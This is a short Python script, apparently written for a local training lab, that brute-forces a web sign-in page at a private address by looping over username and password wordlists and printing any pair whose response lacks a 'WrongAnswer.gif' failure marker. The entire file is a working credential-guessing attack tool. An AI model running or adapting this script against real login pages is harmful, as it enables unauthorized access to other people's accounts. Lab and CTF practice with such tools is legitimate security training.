from requests import post
import requests
import sys
import re

expression = "images/WrongAnswer.gif"

# User names list
u_file = open("users.txt", 'r')
u_list = u_file.readlines()

# Passwords list
p_file = open("passwords.txt", 'r')
p_list = p_file.readlines()

for u in u_list:
    user = u.strip()
    for p in p_list:
        try:
            password = p.strip()
            url = f'http://192.168.56.5/?page=signin&username={user}&password={password}&Login=Login#'
            r = requests.post(url)
            if (not re.search(r"WrongAnswer.gif", r.text)):
                print("User: " + user + " Password: " + password)
                break
        except:
            pass